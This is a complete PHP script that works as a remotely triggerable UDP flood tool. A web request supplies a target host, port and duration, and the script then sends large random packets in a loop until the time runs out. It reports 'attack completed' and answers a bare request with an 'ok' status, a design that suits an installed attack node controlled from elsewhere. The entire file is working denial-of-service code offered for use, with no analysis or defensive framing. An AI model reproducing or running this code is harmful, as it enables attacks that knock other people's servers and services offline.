<?php
error_reporting(E_ERROR | E_WARNING);

ini_set('max_execution_time', 0);

class DoS
{
    const MIN_PACKET_SIZE = 61440; // 60 kB
    const MAX_PACKET_SIZE = 71680; // 70 kB
    
    private $host;
    private $port;
    private $time;
    private $random;

    public function __construct($host, $port, $time, $random)
    {
        Preconditions::checkArgument(strlen($host) , "host parameter missing or has an incorrect format");
        Preconditions::checkArgument(is_numeric($port) , "port parameter missing or has an incorrect format");
        Preconditions::checkArgument(is_numeric($time) , "time parameter missing or has an incorrect format");
        Preconditions::checkArgument(is_bool($random) , "random parameter missing or has an incorrect format");

        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
        $this->random = $random;
    }

    public function flood()
    {
        $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
        if (!$socket)
        {
            throw new Exception($errorMessage);
        }

        $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
        $packet = Random::string($length);

        $endTime = time() + $this->time;
        while (time() <= $endTime)
        {
            @fwrite($socket, $this->random ? str_shuffle($packet) : $packet);
        }
        @fclose($socket);
    }
}

class Random
{
    public static function string($length)
    {
        if (function_exists("openssl_random_pseudo_bytes"))
        {
            return bin2hex(openssl_random_pseudo_bytes($length / 2));
        }
        else
        {
            return str_shuffle(substr(str_repeat(md5(mt_rand()) , 2 + $length / 32) , 0, $length));
        }
    }
}

class Preconditions
{
    public static function checkArgument($expression, $errorMessage)
    {
        if (!$expression)
        {
            throw new InvalidArgumentException($errorMessage);
        }
    }
}

class Application
{
    public static function start($args)
    {
        if (sizeof($args) === 0)
        {
            echo json_encode(array(
                "status" => "ok"
            ));
            return;
        }

        $host = $args['host'];
        $port = isset($args['port']) ? $args['port'] : 80;
        $time = isset($args['time']) ? $args['time'] : 60;
        $random = isset($args['random']) ? $args['random'] === "true" : false;

        try
        {
            (new DoS($host, $port, $time, $random))->flood();
            echo json_encode(array(
                "status" => "attack completed"
            ));
        }
        catch(Exception $e)
        {
            echo json_encode(array(
                "status" => "attack failed",
                "error" => $e->getMessage()
            ));
        }
    }
}

Application::start($_POST ? $_POST : $_GET);

